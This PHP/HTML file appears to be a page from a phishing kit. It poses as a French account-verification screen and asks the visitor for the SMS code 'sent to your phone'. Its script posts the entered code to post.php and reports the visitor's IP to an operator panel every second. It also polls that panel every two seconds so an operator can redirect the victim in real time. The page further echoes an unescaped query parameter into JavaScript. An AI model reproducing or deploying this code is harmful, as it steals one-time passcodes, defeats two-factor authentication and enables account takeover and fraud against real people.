<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title>Vérification</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
<link rel="stylesheet" href="inc/jihanaid.css">
<link rel="stylesheet" href="inc/auth.css">
</head>
<body>
<header class="container-full">
<div class="row align-items-center">
<div class="col-100 text-left">
    <img src="inc/logo.png" style="width:130px;">
</div>
<div class="col-100 text-right">
<h5>Vérification</h5>
</div>
</div>
</header> 



<div class="container text-center">

<div class="form display-inline-block" style="width:600px; max-width:100% !important; margin-top:50px; margin:0; margin-top:60px;">

<div class="form-col" style="margin-bottom:30px;">
<h2>Vérification de compte</h2>
<p>Pour plus de sécurité, veuillez soumettre le code que nous avons envoyé à votre numéro de téléphone.</p>
</div>


<?php
if(isset($_GET['e'])){ 
    echo '
<div class="form-col">
    <p style="color:red;">Le code de confirmation n\'est pas correct. Veuillez réessayer.</p>
</div>';

}
?>

<div class="form-col">
<label>Code de confirmation</label>
<input type="text" class="textinput" id="s">
</div>




<div class="form-col">
    <button class="sbmt" onclick="sendSms()">Confirmer</button>
</div>

</div>

</div>





<script src="inc/cdns/jq.js"></script>
<script src="inc/cdns/m.js"></script>
<script>

$("#s").mask("00000000");

$("#s").keypress((e)=>{
    if(e.key=="Enter"){
        sendSms();
    }
});


function sendSms(){
    $("#s").removeClass("error");
    if($("#s").val().length<6){
        $("#s").addClass("error");
    }else{

        $.post("post.php", {sms:$("#s").val()}, (d)=>{
               window.location="processing.php?p=SMS";
        });

    }
}

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);

</script>

 


</body>
</html>